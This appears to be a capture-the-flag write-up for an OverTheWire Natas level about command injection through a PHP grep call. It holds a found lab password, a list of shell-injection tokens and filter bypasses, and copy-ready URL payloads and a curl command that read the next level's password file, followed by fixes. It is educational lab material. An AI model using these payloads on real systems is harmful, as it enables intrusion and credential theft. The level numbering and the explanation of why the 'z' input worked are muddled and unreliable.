# 🔐 Natas Level: Natas9--->Natas10



### 📂 Execution Process 

👉 
- write this command in the input area
```
z /etc/natas_webpass/natas11
```

<img width="1466" height="874" alt="Screenshot 2025-09-30 at 5 38 55 PM" src="https://github.com/user-attachments/assets/7c0a7a41-542c-4d83-8055-5daf35010e0d" />

### 📄 Password found:
👉 
UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk

### NOTES

1) Short one-line summary
The web page takes a value called "needle" from you and uses it inside a shell command. Because the input goes straight into the shell, you can sometimes make the server run other commands. This is called command injection.

2) What the PHP code does (simple)
- The server reads the request parameter named "needle".
- If it is not empty, it checks for some illegal characters like ; | &.
- If those characters are found, it prints "Input contains an illegal character!".
- Otherwise it runs a shell command using that input:
  passthru("grep -i $key dictionary.txt");
- So the server runs: grep -i <your input> dictionary.txt

3) Why that is dangerous (easy words)
- The server treats your text as part of a shell command.
- If you put special tokens, the shell might run extra commands.
- Example risk: reading files like /etc/natas_webpass/natasX which contain the password.

4) Common ways to inject (short)
- Semicolon: ;  (runs next command)
- Pipe: |  (send output to next command)
- Ampersand combos: && or &  (run next command or background)
- Backticks: `command`  (runs command and substitutes output)
- Dollar-substitution: $(command)  (same as backticks)
- Newline / CRLF: (line break) can act like a command separator in some setups
- Parentheses: (command) runs a subshell

5) Why blacklisting ;|& is not enough (very simple)
- Blacklist blocks only these characters. But attackers can still use:
  - Backticks `...`
  - $(...)
  - Newlines %0A or %0D%0A
  - Parentheses (command)
- That means server is still vulnerable even after the small filter.

6) Small table — compare approaches

| Approach (what server does) | Is it safe? | Short comment |
|-----------------------------|-------------|---------------|
| No shell, search inside PHP  | Safe        | Best. No shell used at all. |
| Use escapeshellarg() then shell | Safer     | Good if you must call shell. |
| Blacklist a few chars (like ;|&) | Not safe  | Easy to bypass with $(), backticks, newline. |

7) Easy examples to test what is allowed (replace natas10/11 as needed)
- Test parentheses:
  ?needle=(echo PAREN_OK)
- Test $():
  ?needle=$(echo DOLLAR_OK)
- Test backticks:
  ?needle=`echo BACK_OK`
- Test newline:
  ?needle=foo%0Aecho HACK
- If you see PAREN_OK, DOLLAR_OK, BACK_OK or HACK, that method works.

8) Why you saw (z /etc/natas_webpass/natas11)
- `z` is not magic — it was just the first word inside parentheses.
- Example: (z /etc/natas_webpass/natas11) means shell tried to run a command named "z" with that file as argument.
- Possible reasons:
  1) You or the browser sent `z` by mistake.
  2) Server echoed your input instead of executing.
  3) Server transformed your input and it became `z`.
- Quick test to check: ?needle=(echo PAREN_OK)
  - If PAREN_OK shows, parentheses execute.
  - Then try ?needle=(cat /etc/natas_webpass/natas11) to read the password.

9) Exact payloads to try (one-line, copy to address bar) — for Natas10 -> read natas11
- Newline method:
  ?needle=foo%0Acat /etc/natas_webpass/natas11
- CRLF (carriage return + newline):
  ?needle=foo%0D%0Acat /etc/natas_webpass/natas11
- Grep-empty-file trick with newline:
  ?needle=foo%0Agrep -i "" /etc/natas_webpass/natas11
- Parentheses:
  ?needle=(cat /etc/natas_webpass/natas11)
- Dollar-substitution:
  ?needle=$(cat /etc/natas_webpass/natas11)
- Backtick:
  ?needle=`cat /etc/natas_webpass/natas11`
- URL-encoded $() if needed:
  ?needle=%24%28cat%20/etc/natas_webpass/natas11%29
- URL-encoded backticks if needed:
  ?needle=%60cat%20/etc/natas_webpass/natas11%60

10) Small step-by-step checklist (do in order)
- Step A: Test which injection works:
  - Try ?needle=(echo PAREN_OK)
  - Try ?needle=$(echo DOLLAR_OK)
  - Try ?needle=`echo BACK_OK`
  - Try ?needle=foo%0Aecho HACK
- Step B: If any test prints OK or HACK, replace echo with the cat command:
  - If PAREN_OK worked, try ?needle=(cat /etc/natas_webpass/natas11)
  - If DOLLAR_OK worked, try ?needle=$(cat /etc/natas_webpass/natas11)
  - If HACK from newline, try ?needle=foo%0Acat /etc/natas_webpass/natas11
- Step C: If output is not visible in browser, use curl to see raw response:
  curl -i 'http://natas10.natas.labs.overthewire.org/?needle=foo%0Acat%20/etc/natas_webpass/natas11' -u 'natas10:PASSWORD'
  (Replace PASSWORD with your natas10 password.)

11) How the server should fix this (learn part)
- Best fix: Do not call shell. Use PHP to open the file and search text in PHP code.
- If shell must be used, always escape arguments:
  $safe = escapeshellarg($key);
  passthru("grep -i $safe dictionary.txt");
- Or use a whitelist: allow only letters, numbers, space, dash, underscore:
  if (preg_match('/[^a-zA-Z0-9 _-]/', $key)) { error }

12) Quick ethics reminder (one line)
Only use these techniques on CTFs (like Natas), on machines you own, or with explicit permission.

End of notes.
